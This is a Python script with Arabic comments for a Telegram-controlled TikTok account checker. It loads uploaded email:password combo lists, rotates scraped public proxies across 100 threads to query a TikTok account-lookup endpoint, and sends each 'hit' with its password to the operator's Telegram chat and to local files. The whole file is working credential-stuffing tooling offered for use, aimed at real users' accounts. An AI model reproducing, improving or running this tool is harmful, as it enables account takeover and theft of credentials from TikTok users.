import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الألوان للكونسول ---
class Colors:
    G = '\033[92m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[0m'

class Stats:
    hits = 0
    bad = 0
    checked = 0
    proxies_list = []
    is_running = False
    total_in_file = 0
    current_hits_list = [] # لتخزين الهيتات وإرسالها كملف في النهاية

# --- إدخال بيانات التحكم ---
TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
ADMIN_ID = input(f"{Colors.C}[?] Enter Your Telegram ID (Chat ID): {Colors.W}").strip()

bot = telebot.TeleBot(TOKEN)

# --- وظيفة سحب البروكسيات ---
def scrape_proxies():
    print(f"{Colors.C}[*] Scrapping proxies...{Colors.W}")
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt"
    ]
    Stats.proxies_list = []
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")

# --- محرك فحص تيك توك الرئيسي ---
def check_tiktok(line):
    if ":" not in line: return
    email, password = line.split(":", 1)
    
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
    
    # اختيار بروكسي عشوائي من القائمة المسحوبة
    proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
    proxy = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None

    params = {
        "email": email,
        "aid": "1233",
        "device_platform": "android",
        "version_code": "240504"
    }
    
    try:
        response = requests.get(url, params=params, proxies=proxy, timeout=7)
        data = response.json()

        # التحقق من نجاح العملية (أن الحساب موجود وصحيح)
        if data.get("message") == "success":
            Stats.hits += 1
            hit_data = f"{email}:{password}"
            Stats.current_hits_list.append(hit_data)
            
            # --- إرسال الـ Hit فوراً إلى البوت ---
            msg = f"✅ **New TikTok Hit!**\n━━━━━━━━━━━━\n📧 `Email:` `{email}`\n🔑 `Pass:` `{password}`\n━━━━━━━━━━━━\n🚀 @kartns V7"
            bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
            
            # حفظ في ملف محلي بالسيرفر كاحتياط
            with open("data/hits_found.txt", "a") as f:
                f.write(hit_data + "\n")
        else:
            Stats.bad += 1
    except:
        pass
    finally:
        Stats.checked += 1

# --- أوامر البوت (Telegram Commands) ---

@bot.message_handler(commands=['start'])
def welcome(message):
    if str(message.from_user.id) != ADMIN_ID: return
    bot.reply_to(message, "🚀 أهلاً بك! أداة فحص تيك توك V7 جاهزة.\n\nقم بإرسال ملف الكومبو (.txt) وسأقوم بالفحص وإرسال الـ Hits هنا فوراً.")

@bot.message_handler(commands=['status'])
def status(message):
    if str(message.from_user.id) != ADMIN_ID: return
    res = f"""
📊 **حالة الفحص الحالية:**
━━━━━━━━━━━━
✅ Hits: {Stats.hits}
❌ Bad: {Stats.bad}
🔄 Checked: {Stats.checked} / {Stats.total_in_file}
🌐 Proxies: {len(Stats.proxies_list)}
━━━━━━━━━━━━
    """
    bot.reply_to(message, res)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if str(message.from_user.id) != ADMIN_ID: return
    if Stats.is_running:
        bot.reply_to(message, "⚠️ الفحص جاري بالفعل، انتظر حتى ينتهي.")
        return

    if message.document.file_name.endswith('.txt'):
        # تحميل الملف من تليجرام
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        if not os.path.exists("data"): os.makedirs("data")
        with open("data/combo.txt", "wb") as f:
            f.write(downloaded_file)
        
        combo = open("data/combo.txt", "r", encoding="utf-8", errors="ignore").read().splitlines()
        Stats.total_in_file = len(combo)
        Stats.current_hits_list = [] # تصفير قائمة الهيتات الجديدة
        
        bot.send_message(ADMIN_ID, f"📥 تم استلام {Stats.total_in_file} حساب. جاري تحديث البروكسيات وبدء الصيد... 🎯")
        
        # تحديث البروكسيات قبل كل فحص
        scrape_proxies()
        
        # بدء الفحص في خيط منفصل (Thread) لعدم تعليق البوت
        threading.Thread(target=start_engine, args=(combo,)).start()
    else:
        bot.reply_to(message, "❌ أرسل ملف نصي فقط!")

def start_engine(combo):
    Stats.is_running = True
    Stats.hits = 0
    Stats.bad = 0
    Stats.checked = 0
    
    # استخدام ThreadPoolExecutor لسرعة خيالية في الفحص (100 خيط)
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(check_tiktok, combo)
    
    Stats.is_running = False
    bot.send_message(ADMIN_ID, f"🏁 **انتهى الفحص!**\n\nإجمالي الـ Hits: {Stats.hits}")
    
    # إرسال ملف الـ Hits النهائي
    if Stats.hits > 0:
        with open("final_hits.txt", "w") as f:
            f.write("\n".join(Stats.current_hits_list))
        with open("final_hits.txt", "rb") as f:
            bot.send_document(ADMIN_ID, f, caption="📂 هذا ملف يحتوي على جميع الـ Hits التي تم صيدها.")

# --- تشغيل البوت ---
if __name__ == "__main__":
    print(f"{Colors.G}[+] Bot is Online! Waiting for commands in Telegram...{Colors.W}")
    bot.infinity_polling()
